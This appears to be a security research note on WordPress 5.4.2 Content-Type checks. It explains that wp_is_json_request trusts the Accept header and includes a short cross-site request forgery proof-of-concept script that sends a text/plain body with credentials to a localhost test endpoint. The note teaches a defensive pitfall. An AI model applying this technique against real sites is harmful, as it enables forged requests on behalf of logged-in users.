### WordPress 5.4.2

**Endpoint**
```php
function testjson1($request) {
  if(wp_is_json_request())
    $data = json_decode($request->getContent(), true);
  }
}

function testjson2($request) {
  $data = $request->get_json_params();
}
```

**Source code**  
[/WordPress/WordPress/wp-includes/load.php](https://github.com/WordPress/WordPress/blob/d7c0343d5f7e0efdad5b7dce64981e74f5d0b7a0/wp-includes/load.php#L1532-L1540)
```php
/wp-includes/load.php
function wp_is_json_request() {
    if ( isset( $_SERVER['HTTP_ACCEPT'] ) && false !== strpos( $_SERVER['HTTP_ACCEPT'], 'application/json' ) ) {
        return true;
    }
    if ( isset( $_SERVER['CONTENT_TYPE'] ) && 'application/json' === $_SERVER['CONTENT_TYPE'] ) {
        return true;
    }
    return false;
```

[/WordPress/WordPress/wp-includes/rest-api/class-wp-rest-request.php](https://github.com/WordPress/WordPress/blob/d7c0343d5f7e0efdad5b7dce64981e74f5d0b7a0/wp-includes/rest-api/class-wp-rest-request.php#L653-L665)
```php
public function get_json_params() {
    $this->parse_json_params();
    return $this->params['JSON'];
}

protected function parse_json_params() {
    ...
    $content_type = $this->get_content_type();
    if ( empty( $content_type ) || 'application/json' !== $content_type['value'] ) {
      return true;
    ...
}
```

**JSON Content-Type**
```
application/json
```

**wp_is_json_request CSRF PoC**  
Not a bug, but can be mistakenly used to check Content-Type
```html
<script>
  fetch('http://localhost/wp-json/testjson/v1/testjson1',{
    method:'POST',
    headers:{'Content-Type':'text/plain', 'Accept':'application/json'},
    body:'{"test":true}',
    credentials: 'include'
  });
</script>
```

**Multipart Content-Type**  
Same as [PHP](ct-tricks/PHP.md)